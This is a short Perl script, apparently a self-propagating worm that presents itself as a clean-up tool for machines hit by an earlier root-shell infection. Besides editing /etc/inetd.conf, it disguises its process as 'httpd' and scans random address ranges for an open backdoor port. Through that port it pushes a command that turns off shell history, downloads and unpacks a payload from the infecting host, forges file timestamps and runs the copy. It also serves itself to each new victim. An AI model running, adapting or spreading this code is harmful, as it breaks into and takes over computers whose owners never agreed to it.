#!/usr/bin/perl -w
#
# removes rootshells running from /etc/inetd.conf
# after a l10n infection... (to stop pesky haqz0rs
# messing up your box even worse than it is already)
# This code was not written with malicious intent.
# Infact, it was written to try and do some good.
#

use Socket;

$0 = "httpd";
@feh = (193..218);
@heh = (1..254);
@pr = (10000..15000);
$li = $ARGV[0];
$c = 0;
$ii = "ADL";

if (-s $ii) {
	exit 0;
}

unlink("./go");

open (II,">$ii");
print II "ADL\n";
close (II);

system("/bin/touch -r /bin/ls $ii");

open (INETD,"/etc/inetd.conf");
while (<INETD>) {
	chomp;
	
	$cfoo = $_;

	if ($cfoo =~ /\/bin\/sh/) {
		
		$cfoo = "";
	}

	$conf[$c] = $cfoo;
	
	$c++;
}
close (INETD);

open (INETD,">/etc/inetd.conf");
foreach (@conf) {
	print INETD "$_\n";
}
close (INETD);

system ("/usr/bin/killall -HUP inetd 1>/dev/null 2>&1");
system ("/bin/killall -HUP inetd 1>/dev/null 2>&1");

$blah = 1;

while ($blah == 1) {

	$ccb = rcb();

	open (PSCAN,"./psm $ccb 10008|");
	while (<PSCAN>) {
		chomp;
		
		$cpi_host = $_;

		infect($cpi_host);
	}
	close (PSCAN);

}

sub rcb {

$a = $feh[ rand scalar @feh ];
$b = $heh[ rand scalar @heh ];

return "$a.$b";

}

sub grp {

return $pr[ rand scalar @pr];

}

sub infect {

$mhih = $_[0];
$mih = inet_aton($mhih);

$rp = grp();

$cmd = "export TERM=vt100 ; export PATH=\"/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin\" ; export HISTFILE=/dev/null ; mkdir /tmp/.cheese ; touch -r /bin/sh /tmp/.cheese ; cd /tmp/.cheese ; lynx -source http://$li:$rp/ >cheese.uue ; uudecode cheese.uue ; tar zxvf cheese.tgz ; rm -f cheese.tgz ; touch -r /bin/sh * ; chmod 755 * ; ./go $mhih ; exit ;";

socket (MIH, 2, 1, 6);
connect (MIH, sockaddr_in(10008, $mih));

	select (MIH);
	$| = 1;

	unless ($pid = fork) {
		serve($rp);
		exit 0;
	}

	sleep (2);

	print MIH "$cmd\n";

	close (MIH);
	sleep (60);
	kill 9, $pid;

}

sub serve {

$srp = $_[0];

socket (SERV, 2, 1, 6);
setsockopt (SERV, SOL_SOCKET, SO_REUSEADDR, pack("l", 1));

bind (SERV, sockaddr_in($srp, INADDR_ANY));
listen (SERV, 100);


$blah = "";

while ($blah = accept (CLI, SERV)) {

        select (CLI);
        $| = 1; 
        
        $moo = <CLI>;
        $moo = <CLI>;
        
        open (SELF,"/tmp/.cheese/cheese.uue");
        while (<SELF>) {
                chomp;
                print CLI "$_\n";
        }
        close (SELF);

}

}
